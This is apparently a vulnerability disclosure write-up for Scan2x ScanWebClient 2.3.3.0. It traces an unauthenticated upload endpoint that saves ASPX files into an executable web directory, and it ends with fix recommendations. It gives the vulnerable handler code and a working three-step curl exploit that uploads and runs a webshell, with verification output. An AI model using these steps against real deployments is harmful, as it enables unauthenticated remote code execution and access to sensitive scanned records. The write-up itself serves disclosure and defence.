# Scan2x ScanWebClient — Unauthenticated File Upload → Webshell RCE

## 1. Research Target & Attack Surface

Scan2x ScanWebClient 2.3.3.0 (Avantech Software UK) is the web component of the Scan2x document-scanning suite. It processes scanned documents that often include sensitive business and medical records, so a compromise is high-impact. The product is a Windows IIS stack: the installer ships a desktop client plus `SCLWebUpdater.exe` (VB.NET self-updater); the web application is pulled by the updater from the vendor's update server. Relevant web components: `ScanWebClient` (the application), plus siblings `ScanWebServer`, `ScanOnlineAPI`, and `ADLogin`.

Relevant surface:

| Component | Config |
|---|---|
| `ScanWebClient` | `<authorization><allow users="*"/></authorization>` — explicit allow-all |
| `ScanWebClient/external` | Same allow-all |
| `ScanWebServer` | No authorization restriction |
| `ADLogin` | Windows auth, deny `?` |
| `FileUploadHandler.ashx` | `@WebHandler` — IIS SimpleHandlerFactory serves it directly |

The IIS site has `anonymousAuthentication=True`; `Global_asax.cs` `Application_BeginRequest` is empty (`{ }`) — no authentication gate (CWE-306).

## 2. Sink Identification: SaveAs into the Web Root (CWE-434 → CWE-94)

`FileUploadHandler.ashx` (`ScanWebClient.FileUploadHandler.ProcessRequest`) is a generic file-upload endpoint:

```csharp
public class FileUploadHandler : IHttpHandler {
    public bool IsReusable => false;
    public void ProcessRequest(HttpContext context) {
        try {
            if (context.Request.Files.Count > 0) {
                HttpPostedFile httpPostedFile = context.Request.Files[0];
                string text = context.Server.MapPath("~/_ScannedFiles/");
                string fileName = Path.GetFileName(httpPostedFile.FileName);
                httpPostedFile.SaveAs(text + fileName);   // no extension whitelist, no MIME/content check
                ...
            }
        } catch (Exception ex) { /* 500 + "Error: " + ex.Message */ }
    }
}
```

Three properties make this a webshell upload:
1. `Path.GetFileName` preserves the original extension (e.g. `.aspx`)
2. `SaveAs(text + fileName)` writes into the web root `_ScannedFiles/` — no extension whitelist, no MIME check, no content check
3. `_ScannedFiles/` is **not shipped** with the product (created at runtime by SaveAs), so it ships **without a `web.config` handler blocker**

### 3.1 _ScannedFiles is executable

- IIS handler inheritance: the root `PageHandlerFactory-Integrated-4.0` mapping for `*.aspx` flows into `_ScannedFiles/*.aspx` → ASPX executes
- The only `HttpNotFoundHandler` blocker lives in `Views/web.config` (`BlockViewHandler`, `path="*"`) and covers only `Views/`, not `_ScannedFiles/`
- IIS request-filtering `fileExtensions` blacklist (blocks `.config`, `.cs`, `.vb`, `.asax`, `.ascx`, `.master`, ...) does **not** include `.aspx` — absence = allowed
- `maxAllowedContentLength=104857600` (100 MB); a webshell is ~1 KB

### 3.2 The cosmetic 500

The handler calls `Response.End()` after `SaveAs`; `Response.End()` throws `ThreadAbortException`, which the catch block rewrites as HTTP 500. But `SaveAs` has already completed, so the raw response body is:

```
{"name":"s2x_rce.aspx"}{"name":"Error: ..."}
```

The success JSON is flushed before the error JSON is appended. Tools like `Invoke-WebRequest` show an empty body on 500; a raw socket reveals the truth. **HTTP 500 here does not mean the upload failed.**

## 3. Source: The Upload Parameter

The source is the multipart `file` field of `POST /FileUploadHandler.ashx`. The handler takes `Request.Files[0]`, uses its `FileName` verbatim (after `Path.GetFileName`), and saves it with no additional validation. The filename, the extension, and the content are all attacker-controlled.

## 4. End-to-End Data Flow

```
POST /FileUploadHandler.ashx
  (multipart, file=s2x_rce.aspx) — no authentication
    → FileUploadHandler.ProcessRequest
    → Server.MapPath("~/_ScannedFiles/") → _ScannedFiles/
    → SaveAs("_ScannedFiles/s2x_rce.aspx")   ← file lands in web root
    → Response.End() → ThreadAbortException → HTTP 500 (cosmetic)

GET /_ScannedFiles/s2x_rce.aspx
    → IIS PageHandlerFactory executes the ASPX
    → webshell runs cmd.exe /c <command>, writes marker with server-side token
```

## 5. Exploit Construction

```bash
# STEP 1: upload an ASPX webshell
curl -s -X POST "http://<TARGET_IP>:8723/FileUploadHandler.ashx" \
  -F "file=@s2x_rce.aspx;filename=s2x_rce.aspx"
# HTTP 500 (cosmetic) — body: {"name":"s2x_rce.aspx"}{"name":"Error: ..."}
# File already saved to _ScannedFiles/s2x_rce.aspx

# STEP 2: execute it
curl -s "http://<TARGET_IP>:8723/_ScannedFiles/s2x_rce.aspx"
# HTTP 200 — webshell runs cmd.exe /c whoami, writes a marker with a server-side token

# STEP 3: read the marker for deterministic proof
curl -s "http://<TARGET_IP>:8723/_ScannedFiles/rce_marker_<rand>.txt"
```

The webshell writes a unique token (`SCAN2X_UNAUTH_RCE_PROOF_<ticks>`) generated server-side via `DateTime.Now.Ticks` (unforgeable by the client) into the marker file and echoes it in the response — a deterministic proof of execution.

## 6. Dynamic Verification

Verified on ScanWebClient 2.3.3.0 (Windows Server, IIS, .NET 4.8 integrated pool):

| Step | Request | Response | Evidence |
|---|---|---|---|
| 1 | POST webshell | HTTP 500 (cosmetic), body `{"name":"s2x_rce.aspx"}{"name":"Error: ..."}` | File saved |
| 2 | GET shell.aspx | HTTP 200, `WHOAMI_OUTPUT = iis apppool\scan2xscanwebclientpool` | Command execution |
| 3 | GET marker.txt | HTTP 200, `TOKEN=SCAN2X_UNAUTH_RCE_PROOF_<ticks>` + whoami | Deterministic confirmation |

Execution identity: `iis apppool\scan2xscanwebclientpool` (ApplicationPoolIdentity, High Mandatory Level, IIS_IUSRS member). Two independent runs with fresh shells/tokens confirmed the result.

## 7. Reachability & Impact

- **Auth**: none — `allow users="*"`, empty `Application_BeginRequest`, IIS anonymousAuthentication=True
- **Network**: any host that can reach the ScanWebClient HTTP port
- **Upload**: accepts any file, no auth, no configId/extension/MIME validation
- **Execution**: `_ScannedFiles/*.aspx` executed by IIS PageHandlerFactory
- **No MITM**: pure inbound HTTP upload + GET

The impact is unauthenticated remote code execution as the IIS app-pool identity — full control of the ScanWebClient host and access to scanned-document data (which may include sensitive business/medical records).

## 8. Fix Recommendations

1. Add an extension whitelist to `FileUploadHandler` (PDF/TIF/JPG/PNG scan formats only)
2. Store uploads outside the web root, or ship a `web.config` handler blocker for `_ScannedFiles/`
3. Validate MIME and content signatures before saving
4. Require authentication on upload endpoints
5. Run the app pool with least privilege
